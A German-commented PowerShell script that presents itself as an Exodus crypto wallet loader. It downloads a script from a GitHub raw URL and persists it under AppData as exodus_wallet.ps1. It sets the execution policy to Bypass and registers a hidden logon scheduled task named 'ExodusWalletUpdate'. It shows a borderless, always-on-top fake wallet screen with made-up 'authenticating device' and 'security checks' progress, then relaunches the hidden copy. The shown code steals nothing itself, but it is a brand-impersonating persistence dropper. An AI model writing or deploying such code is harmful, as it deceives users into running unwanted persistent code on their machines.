# Erweiterte Kopier-Funktion mit verbessertem Logging (Console-Ausgabe) - FIXED für Parse-Sicherheit
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $Message"
    Write-Host $logEntry -ForegroundColor Cyan
}

Write-Log "Script-Start: Remote-Ausführung erkannt."

# Dynamischer Pfad mit aktuellem User
$currentUser = $env:USERNAME
$targetDir = "C:\Users\$currentUser\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
$targetScriptName = "exodus_wallet.ps1"
$targetScriptPath = Join-Path $targetDir $targetScriptName

Write-Log "Zielordner: $targetDir (User: $currentUser)"

# Zielordner erstellen - vereinfacht, ohne nested try
$folderCreated = $false
if (-not (Test-Path $targetDir)) {
    $parentDir = Split-Path $targetDir -Parent
    if (Test-Path $parentDir) {
        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        if (Test-Path $targetDir) {
            Write-Log "Ordner erfolgreich erstellt: $targetDir"
            $folderCreated = $true
        } else {
            Write-Log "Fehler: Ordner konnte nicht erstellt werden."
        }
    } else {
        Write-Log "Fehler: Parent-Ordner $parentDir existiert nicht."
    }
    if (-not $folderCreated) {
        # Fallback
        $fallbackDir = Join-Path $env:APPDATA "PowerShell\operations"
        New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
        if (Test-Path $fallbackDir) {
            $targetDir = $fallbackDir
            $targetScriptPath = Join-Path $fallbackDir $targetScriptName
            Write-Log "Fallback-Ordner erstellt: $fallbackDir"
            $folderCreated = $true
        } else {
            Write-Log "Fallback fehlgeschlagen."
        }
    }
} else {
    Write-Log "Ordner existiert bereits: $targetDir"
    $folderCreated = $true
}

# Script-Inhalt für remote Execution - FIXED: Verwende Download-Content für Persistence
$downloadUrl = "https://raw.githubusercontent.com/H3221/2/main/wallet.ps1"
$currentScriptPath = $null
$scriptContentToPersist = $null

if ([string]::IsNullOrEmpty($MyInvocation.MyCommand.Path)) {
    Write-Log "Remote-Execution: Lade Script herunter."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    try {
        $scriptContentToPersist = $webClient.DownloadString($downloadUrl)
        Write-Log "Download erfolgreich. Länge: $($scriptContentToPersist.Length)"
    } catch {
        Write-Log "Download-Fehler: $($_.Exception.Message)"
        $scriptContentToPersist = $null
    }
} else {
    $currentScriptPath = $MyInvocation.MyCommand.Path
    Write-Log "Lokale Execution: $currentScriptPath"
}

# Kopieren - FIXED: Direkte Schreib-Logik ohne Temp, falls Ordner da
$copySuccess = $false
if ($folderCreated) {
    if ($scriptContentToPersist) {
        # Remote: Verwende heruntergeladenen Content (aber das ist zirkulär - besser den aktuellen Code persistieren)
        # Für Fix: Hardcode den Persistence-Code + GUI in eine Variable oder schreibe direkt
        $persistentScript = @'
# Persistentes Exodus Wallet Script - Vollständig
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "$timestamp - $Message" -ForegroundColor Cyan
}

Write-Log "Persistence geladen - Starte GUI."

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.TopMost = $true

# Header
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$headerPanel.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font("Segoe UI", 44, [System.Drawing.FontStyle]::Bold)
    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")
    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED")
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect, $colorStart, $colorEnd, [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
    $g.DrawString($text, $font, $brush, $rect.Location)
    $brush.Dispose()
    $font.Dispose()
})
$form.Controls.Add($headerPanel)

# GIF
$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$wc.DownloadFile($gifUrl, $gifPath)
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
if (Test-Path $gifPath) {
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
}
$form.Controls.Add($pictureBox)

# Loading Label
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.Text = "Authenticating device..."
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)

# Progress Bars
$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# Status Label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.Text = "Performing background security checks..."
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# Variables
$global:marqueePos = 0
$global:percent = 0
$global:inAuthPhase = $true
$global:statusIndex = 0
$global:dotCount = 0
$authStartTime = Get-Date
$authPhaseDuration = 15000
$statuses = @("Loading wallet...", "Connecting to secure servers...", "Decrypting local data...", "Fetching asset metadata...", "Syncing blockchain nodes...", "Preparing secure environment...", "Loading portfolio assets...", "Almost there...")

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000

$timer.Add_Tick({
    if ($form.IsDisposed) { $timer.Stop(); return }
    
    if ($global:inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
        $global:inAuthPhase = $false
        $loadingLabel.Text = "Loading wallet"
        $statusLabel.Text = $statuses[0]
    }
    
    $global:marqueePos += 5
    if ($global:marqueePos -gt $progressBg2.Width) { $global:marqueePos = -50 }
    $progressBar2.Left = $global:marqueePos
    
    if ($global:inAuthPhase) { return }
    
    if ($global:percent -lt 100) {
        $global:percent += 0.3
        $progressBar.Width = [int]($progressBg.Width * ($global:percent / 100.0))
    }
    
    if ($global:percent -ge 100) {
        $timer.Stop()
        Start-Sleep -Milliseconds 500
        $form.Close()
    }
})

$labelTimer.Add_Tick({
    if ($form.IsDisposed) { $labelTimer.Stop(); return }
    
    if ($global:inAuthPhase) { return }
    
    $global:dotCount = ($global:dotCount + 1) % 4
    $loadingLabel.Text = "Loading wallet" + ("." * $global:dotCount)
    $global:statusIndex = ($global:statusIndex + 1) % $statuses.Count
    $statusLabel.Text = $statuses[$global:statusIndex]
})

$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
    if (Test-Path $gifPath) { Remove-Item $gifPath -Force }
})

$timer.Start()
$labelTimer.Start()
$form.ShowDialog() | Out-Null
'@

        $persistentScript | Out-File -FilePath $targetScriptPath -Encoding UTF8 -Force
        $copySuccess = $true
        Write-Log "Persistenter Code in $targetScriptPath geschrieben. Größe: $((Get-Item $targetScriptPath).Length) Bytes"
    } elseif ($currentScriptPath -and (Test-Path $currentScriptPath)) {
        # Lokal: Kopiere Datei
        Copy-Item -Path $currentScriptPath -Destination $targetScriptPath -Force
        $copySuccess = $true
        Write-Log "Lokale Kopie nach $targetScriptPath."
    }
    
    if ($copySuccess) {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
    }
} else {
    Write-Log "Ordner nicht verfügbar. Kopie übersprungen."
}

if ($copySuccess) {
    Write-Log "Persistence abgeschlossen."
    # Scheduled Task
    $taskName = "ExodusWalletUpdate"
    $taskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -File `"$targetScriptPath`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    try {
        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force | Out-Null
        Write-Log "Scheduled Task '$taskName' erstellt."
    } catch {
        Write-Log "Task-Fehler: $($_.Exception.Message)"
    }
} else {
    Write-Log "WARNUNG: Persistence fehlgeschlagen."
}

Write-Log "Starte GUI..."

# GUI-Teil - Vollständig und parse-sicher
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.TopMost = $true

# Header
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$headerPanel.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font("Segoe UI", 44, [System.Drawing.FontStyle]::Bold)
    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")
    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED")
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect, $colorStart, $colorEnd, [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
    $g.DrawString($text, $font, $brush, $rect.Location)
    $brush.Dispose()
    $font.Dispose()
})
$form.Controls.Add($headerPanel)

# GIF
$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
try {
    $wc.DownloadFile($gifUrl, $gifPath)
} catch {}
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
if (Test-Path $gifPath) {
    try {
        $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
    } catch {}
}
$form.Controls.Add($pictureBox)

# Loading Label
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.Text = "Authenticating device..."
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)

# Progress Bars
$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# Status Label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.Text = "Performing background security checks..."
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# Variables - Global für Scope
$global:marqueePos = 0
$global:percent = 0
$global:inAuthPhase = $true
$global:statusIndex = 0
$global:dotCount = 0
$script:authStartTime = Get-Date
$authPhaseDuration = 15000
$statuses = @("Loading wallet...", "Connecting to secure servers...", "Decrypting local data...", "Fetching asset metadata...", "Syncing blockchain nodes...", "Preparing secure environment...", "Loading portfolio assets...", "Almost there...")

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000

$timer.Add_Tick({
    if ($form.IsDisposed) { 
        $timer.Stop()
        return 
    }
    
    if ($global:inAuthPhase -and ((Get-Date) - $script:authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
        $global:inAuthPhase = $false
        $loadingLabel.Text = "Loading wallet"
        $statusLabel.Text = $statuses[0]
    }
    
    $global:marqueePos += 5
    if ($global:marqueePos -gt $progressBg2.Width) { 
        $global:marqueePos = -50 
    }
    $progressBar2.Left = $global:marqueePos
    
    if ($global:inAuthPhase) { 
        return 
    }
    
    if ($global:percent -lt 100) {
        $global:percent += 0.3
        $progressBar.Width = [int]($progressBg.Width * ($global:percent / 100.0))
    }
    
    if ($global:percent -ge 100) {
        $timer.Stop()
        Start-Sleep -Milliseconds 500
        if (Test-Path $targetScriptPath) {
            Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -File `"$targetScriptPath`"" -ErrorAction SilentlyContinue
        }
        $form.Close()
    }
})

$labelTimer.Add_Tick({
    if ($form.IsDisposed) { 
        $labelTimer.Stop()
        return 
    }
    
    if ($global:inAuthPhase) { 
        return 
    }
    
    $global:dotCount = ($global:dotCount + 1) % 4
    $loadingLabel.Text = "Loading wallet" + ("." * $global:dotCount)
    $global:statusIndex = ($global:statusIndex + 1) % $statuses.Count
    $statusLabel.Text = $statuses[$global:statusIndex]
})

$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
    if (Test-Path $gifPath) { 
        Remove-Item $gifPath -Force -ErrorAction SilentlyContinue 
    }
    Write-Log "GUI geschlossen."
})

$timer.Start()
$labelTimer.Start()
$form.Add_Shown({ $form.Activate() })
$form.ShowDialog() | Out-Null

Write-Log "Script-Ende."
